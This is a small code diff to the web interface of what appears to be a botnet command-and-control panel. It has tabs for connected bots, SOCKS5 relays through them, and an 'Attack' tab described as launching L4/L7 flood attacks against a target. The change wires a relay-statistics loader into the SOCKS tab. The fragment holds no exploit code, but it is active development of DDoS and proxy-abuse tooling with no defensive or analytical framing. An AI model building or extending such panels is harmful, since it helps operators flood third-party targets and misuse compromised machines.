@@ -109,7 +109,7 @@
         <div class="tab-bar">
             <button class="tab active" data-tab="tab-bots" onclick="switchTab(this)" data-tooltip="All connected bots and their stats">Bots <span class="tab-count"
                     id="tab-bots-count">0</span></button>
-            <button class="tab" data-tab="tab-socks" onclick="switchTab(this)" data-tooltip="Active SOCKS5 proxies and relay health">SOCKS <span class="tab-count"
+            <button class="tab" data-tab="tab-socks" onclick="switchTab(this);loadRelayStats()" data-tooltip="Active SOCKS5 proxies and relay health">SOCKS <span class="tab-count"
                     id="tab-socks-count">0</span></button>
             <button class="tab" data-tab="tab-attack" onclick="switchTab(this)" data-tooltip="Launch L4/L7 flood attacks against a target">Attack</button>
             <button class="tab" data-tab="tab-activity" onclick="switchTab(this)" data-tooltip="Real-time event log — connections, disconnects, commands">Activity</button>
